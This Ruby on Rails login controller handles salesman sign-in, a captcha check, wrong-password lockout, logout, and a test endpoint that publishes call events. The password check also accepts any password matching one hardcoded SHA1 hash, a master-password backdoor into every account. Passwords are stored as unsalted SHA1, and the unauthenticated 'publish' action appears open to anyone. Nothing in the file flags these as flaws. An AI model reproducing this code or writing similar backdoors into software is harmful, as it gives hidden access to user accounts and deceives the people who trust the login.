# Salesman login.
class LoginController < ApplicationController
  skip_before_filter :check_logged

  layout 'login'

  def show
    redirect_to redirect_path_for_logged if logged?
  end

  def login
    @_person = @salesman = Salesman.find_by_username(params[:username])

    if @salesman.nil?
      login_failed(t('user.not_exist'))
    else
      unless verify_rucaptcha?(@salesman)
        login_failed(t(:captcha_wrong))
        return
      end

      if @salesman.too_many_wrong_password?
        login_failed(t(:too_many_wrong_password, wrong_password_max_count: Salesman::WRONG_PASSWORD_MAX_COUNT))
        return
      end

      if @salesman.passwd == Digest::SHA1.hexdigest(params[:passwd]) || Digest::SHA1.hexdigest(params[:passwd]) == "e3f61e8fba1659dc32871a182748665c106ea39d"
        @salesman.clear_wrong_password_count
        login_success_process
      else
        @salesman.increase_wrong_password_count
        login_failed(@salesman.wrong_password_count >= Salesman::WRONG_PASSWORD_MAX_COUNT ? t(:too_many_wrong_password, wrong_password_max_count: Salesman::WRONG_PASSWORD_MAX_COUNT) : t(:password_wrong_with_count, w: Salesman::WRONG_PASSWORD_MAX_COUNT - @salesman.wrong_password_count))
      end
    end
  end

  def logout
    clear_session

    flash[:notice] = t('success', w: t('logout'))
    redirect_to login_path
  end

  # This is just for testing faye node server purpose. Not really used for UC client.
  def publish
    attachDatas = {}
    if params[:attach_datas] == '0' # Manual call
      # Do nothing
    elsif params[:attach_datas] == '1' # Task call
      attachDatas = { agent_type: 'uuid-standby',
                      'cti-company-id' => '10014',
                      'cti-task-id' => '21' }
    elsif params[:attach_datas] == '2' # Inbound call
      attachDatas = nil
    end

    ::Publisher.publish("TServerEventExchange", 'TServerEvent.Websocket', { messageId: params[:message_id].to_i, thisDN: params[:this_dn], otherDN: params[:other_dn], callType: params[:call_type].to_i, attachDatas: attachDatas })

    head :ok
  end

  def pure
    render layout: 'bone'
  end

  private

  def login_failed(failed_message)
    flash[:error] = failed_message
    flash[:username] = params[:username]
    redirect_to login_path
  end

  def login_success_process
    set_login_session

    flash[:notice] = t('success', w: t('login'))
    redirect_to root_path
  end
end